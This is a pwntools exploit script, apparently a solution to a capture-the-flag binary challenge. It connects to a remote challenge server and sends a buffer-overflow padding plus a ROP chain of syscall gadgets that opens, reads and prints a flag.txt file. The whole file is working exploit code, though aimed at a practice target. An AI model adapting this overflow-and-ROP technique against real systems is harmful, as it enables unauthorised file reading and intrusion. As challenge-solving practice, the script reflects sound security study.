from pwn import *

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
#libc = ELF("../glibc/libc.so.6")
ld_preload = {"LD_PRELOAD": "/home/fresh/github/CTF/2023/Defcon31/htb-defcon/challenge/glibc/libc.so.6"}


#p = process("./mgs")
p = remote('94.237.58.168', 32909)
#p =gdb.debug('./mgs', '''
#b *main
#b *vuln
#b *vuln+19''', env=ld_preload)


pop_rax = 0x00000000004503f7
pop_rdi = 0x00000000004021ef
pop_rsi = 0x000000000040a21e
pop_rdx = 0x0000000000482476
syscall = 0x000000000041aeb6 # syscall; ret;

flag = 0x4ca010 # heap memory

# 24 byte padding
# read literal string "flag.txt" into RW .data section address.
# read(0, [flag.txt memory address], 0x10);
exploit = cyclic(24)
exploit += p64(pop_rdi)
exploit += p64(0x0)
exploit += p64(pop_rsi)
exploit += p64(flag)
exploit += p64(pop_rdx)
exploit += p64(0x9)
exploit += p64(pop_rax)
exploit += p64(0x0)
exploit += p64(syscall)

# open([flag.txt memory address], 4)
exploit += p64(pop_rdi)
exploit += p64(flag)
exploit += p64(pop_rsi)
exploit += p64(0x40)
exploit += p64(pop_rax)
exploit += p64(0x2)
exploit += p64(syscall)

# read(0, [flag.txt memory address], 0x10);
exploit += p64(pop_rdi)
exploit += p64(0x3)
exploit += p64(pop_rsi)
exploit += p64(flag)
exploit += p64(pop_rdx)
exploit += p64(0x20)
exploit += p64(pop_rax)
exploit += p64(0x0)
exploit += p64(syscall)

# write(1, [flag.txt memory address], 0x10)
exploit += p64(pop_rdi)
exploit += p64(0x1)
exploit += p64(pop_rsi)
exploit += p64(flag)
exploit += p64(pop_rdx)
exploit += p64(0x20)
exploit += p64(pop_rax)
exploit += p64(0x1)
exploit += p64(syscall)

# exit
exploit += p64(pop_rax)
exploit += p64(0x3c)
exploit += p64(pop_rdi)
exploit += p64(0x0)

pause()
p.sendline(exploit)
p.sendline(b'flag.txt\0')
pause()
p.interactive()
